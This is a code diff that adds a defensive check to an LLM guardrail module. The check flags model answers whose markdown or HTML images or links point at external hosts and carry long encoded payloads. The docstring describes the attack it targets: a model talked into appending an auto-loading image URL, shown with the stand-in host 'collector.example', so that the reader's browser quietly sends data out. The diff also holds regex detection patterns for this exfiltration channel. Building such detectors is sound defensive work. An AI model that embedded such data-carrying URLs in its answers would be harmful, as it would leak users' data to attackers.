@@ -32,6 +32,7 @@ operator can see why.
 
 from __future__ import annotations
 
+import re
 import unicodedata
 from collections.abc import Sequence
 
@@ -249,6 +250,110 @@ def denied_pattern(text: str, pattern_ids: Sequence[str] | None) -> FormatCheck:
         ok=False,
         reason=f"Matched a screened pattern configured for this tenant: {spec.label}.",
     )
+
+
+#: Hosts this rail stays quiet about. Deliberately tiny, and **not** an allowlist of
+#: "safe internet": loopback is this deployment talking to itself, and ``example.com``
+#: is IANA-reserved under RFC 2606 — nobody can register a subdomain of it, so it can
+#: never be an attacker's collector, and it is what documentation and fixtures use.
+#: Every other host is measured.
+_EXFIL_HOST_EXEMPT: tuple[str, ...] = ("localhost", "127.0.0.1", "example.com")
+
+#: A markdown image — ``![alt](url)`` — is the canonical exfiltration channel for an
+#: LLM answer, because the renderer fetches the URL with **no click**: the data is
+#: gone before the reader has read the sentence it was hidden in. A markdown link
+#: needs a click and is the weaker half of the same shape, kept because "click here
+#: for your report" is not a hard sell.
+_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")
+_MARKDOWN_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url>https?://[^)\s]+)")
+
+#: An HTML image, for a renderer that accepts markup.
+_HTML_IMAGE = re.compile(r"<img\b[^>]*\bsrc\s*=\s*[\"']?(?P<url>[^\"'>\s]+)", re.I)
+
+#: How many characters of opaque payload in a URL's query, path or fragment make it a
+#: carrier rather than an identifier. A session id or a UUID is ~36; a base64 blob
+#: worth exfiltrating is longer. Set above the shapes a real URL has so an ordinary
+#: link to a documentation page with a tracking parameter is not a finding.
+_EXFIL_PAYLOAD_MIN = 48
+
+#: A run of characters that carries data rather than naming a resource: base64,
+#: base64url, hex or percent-encoding. ``/`` is deliberately **not** in the class:
+#: with it, ``…/technology-choices/compute-decision-tree`` is one 40-character run and
+#: every long documentation URL becomes a finding. The cost of leaving it out is that
+#: a standard-alphabet base64 blob containing ``/`` is measured in segments rather
+#: than whole, which is why the query string — where a payload actually goes, and
+#: where ``/`` is rare — is measured with it allowed.
+_OPAQUE_RUN = re.compile(r"[A-Za-z0-9+=_%\-]{" + str(_EXFIL_PAYLOAD_MIN) + ",}")
+_OPAQUE_RUN_QUERY = re.compile(r"[A-Za-z0-9+/=_%\-]{" + str(_EXFIL_PAYLOAD_MIN) + ",}")
+
+
+def _external_host(url: str) -> str | None:
+    """Return the host of an absolute http(s) URL, or ``None`` when it has none."""
+    match = re.match(r"https?://(?P<host>[^/?#\s:]+)", url, re.I)
+    if match is None:
+        return None
+    host = match.group("host").lower()
+    if host in _EXFIL_HOST_EXEMPT or any(
+        host.endswith("." + exempt) for exempt in _EXFIL_HOST_EXEMPT
+    ):
+        return None
+    return host
+
+
+def exfiltration_channel(text: str) -> FormatCheck:
+    """Flag an outbound answer that carries data out through a URL nobody clicked.
+
+    **MITRE ATLAS AML.T0024, Exfiltration via AI Inference API.** Every other rail on
+    the outbound path asks whether the *words* are safe. This one asks whether the
+    answer is a **channel**: an ``![](https://collector.example/?d=<blob>)`` in a
+    rendered reply is a GET the reader's own browser makes before they have read the
+    sentence, to a host of the attacker's choosing, carrying whatever the model was
+    talked into appending. It is how the same class of bug was demonstrated against
+    several shipped assistants, and the payload never has to look like a secret,
+    because the rail that would recognise a secret sees base64.
+
+    The finding is the **shape**, not the content: an image or link to an external
+    host whose query, path or fragment carries at least
+    :data:`_EXFIL_PAYLOAD_MIN` characters of opaque encoded run. That is what keeps
+    the false-positive cost low — a model citing ``https://docs.example.org/guide`` or
+    quoting a signed URL a *user* supplied has no reason to hit this — and it is also
+    the honest limit: a short payload (a name, a single account number) fits under the
+    floor, and an answer that merely *tells* the reader to visit a collector is a
+    social-engineering problem this rail does not solve.
+
+    Args:
+        text: The model's answer text.
+
+    Returns:
+        A :class:`FormatCheck`; ``ok`` is ``False`` when the answer carries such a
+        channel, and the reason names the host so an operator can see where the data
+        was going.
+    """
+    for pattern, shape in (
+        (_MARKDOWN_IMAGE, "an auto-loading markdown image"),
+        (_HTML_IMAGE, "an auto-loading HTML image"),
+        (_MARKDOWN_LINK, "a markdown link"),
+    ):
+        for match in pattern.finditer(text):
+            url = match.group("url")
+            host = _external_host(url)
+            if host is None:
+                continue
+            _, _, tail = url.partition(host)
+            path, sep, query = tail.partition("?")
+            if not sep:
+                path, sep, query = tail.partition("#")
+            if _OPAQUE_RUN.search(path) or _OPAQUE_RUN_QUERY.search(query):
+                return FormatCheck(
+                    ok=False,
+                    reason=(
+                        f"Output carries an exfiltration channel: {shape} pointing at "
+                        f"the external host {host!r} with an encoded payload in the "
+                        "URL. A rendered answer fetches that URL, so the payload "
+                        "leaves this deployment without anyone acting on it."
+                    ),
+                )
+    return FormatCheck(ok=True, reason="Output carries no exfiltration channel.")
 
 
 def content_filter(text: str) -> FormatCheck:
